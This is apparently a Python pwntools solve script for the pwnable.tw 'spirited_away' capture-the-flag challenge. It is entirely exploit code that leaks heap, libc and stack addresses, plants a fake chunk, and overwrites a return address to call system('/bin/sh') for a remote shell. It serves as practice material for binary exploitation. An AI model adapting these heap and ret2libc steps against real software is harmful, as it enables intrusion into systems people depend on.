import sys
from pwn import *

if len(sys.argv) != 2:
	print "sys.argv[1] = r : remote	l : local"
	exit()

#context.log_level = 'debug'

if sys.argv[1].strip() == 'l':
	p = process('./spirited_away')
elif sys.argv[1].strip() == 'r':
	p = remote('chall.pwnable.tw', 10204)

e = ELF('./spirited_away')

if sys.argv[1].strip() == 'l':
	l = e.libc
elif sys.argv[1].strip() == 'r':
	l = ELF('./libc_32.so.6')

def movie(name, age, reason, comment):
	p.sendafter('enter your name:', str(name))
	sleep(0.03)
	p.sendlineafter('Please enter your age: ', str(age))
	sleep(0.03)
	p.sendafter('Why did you came to see this movie? ', str(reason))
	sleep(0.03)
	p.sendafter('Please enter your comment: ', str(comment))
	sleep(0.03)

def movie2(name, age, reason, comment):
	p.sendafter('enter your name:', str(name))
	sleep(0.03)
	p.sendafter('Why did you came to see this movie? ', str(reason))
	sleep(0.03)
	p.sendafter('Please enter your comment: ', str(comment))
	sleep(0.03)


pause()
log.info(hex(e.got['puts']))
for i in range(100):
	print (i)
	movie('1', 5, 'a', 'a')
	sleep(0.03)
	p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

### heap base leak

movie(p32(0) + p32(0x71), '1' * 0x30 + p32(0) + p32(0xfd1), 3, 'a' * 84)
p.recvuntil("a" * 84)
heapbase = u32(p.recv(4)) - 0x410
StdoutBuffer = heapbase
StdinBuffer = heapbase + 0x408 + 0x40
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

log.info('heap base : ' + hex(heapbase))
log.info('first chunk : ' + hex(heapbase + 0x408))
log.info('Stdout Buffer : ' + hex(StdoutBuffer))
log.info('Stdin Buffer : ' + hex(StdinBuffer))

### libc leak
movie2(p32(0), 1, 1, 'b' * 84 + p32(heapbase + 0x408 + 4 * 4)) # stdoutBuffer into unsorted bin
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

movie2('a' * 4, 1, 1, 'b') # this malloc is spilted in unsorted bin 
main_arena_leak = u32(p.recvuntil('\xf7')[-4:])
libc = main_arena_leak - 88 - 0x58 - l.sym['__malloc_hook']
log.info('libc : ' + hex(libc))
log.info('free hook : ' + hex(libc + l.sym['__free_hook']))
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')
###########################
### stack leak
movie2(1, 1, 'a' * 0x50, 1)
p.recvuntil('a' * 0x50)
ebp = u32(p.recv(4)) - 0x20
log.info('ebp : ' + hex(ebp))

log.info('fake chunk : ' + hex(ebp - 0x50 + 8))
fake_chunk = p32(0) + p32(0x41)
fake_chunk += 'a' * (0x40 - 8)
fake_chunk += p32(0)
fake_chunk += p32(0x10)
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')
##########################
movie2(1,1, fake_chunk, 1)
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

### system('/bin/sh\x00')
movie2(1,1,1, 'b' * 84 + p32(ebp - 0x50 + 8))
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

payload = 'a' * (0x50 - 8)
payload += p32(0)
payload += p32(libc + l.sym['system'])
payload += p32(0)
payload += p32(libc + next(l.search('/bin/sh\x00')))
movie2(payload, 1,1,1)
p.sendafter('Would you like to leave another comment? <y/n>: ', 'n')

p.interactive()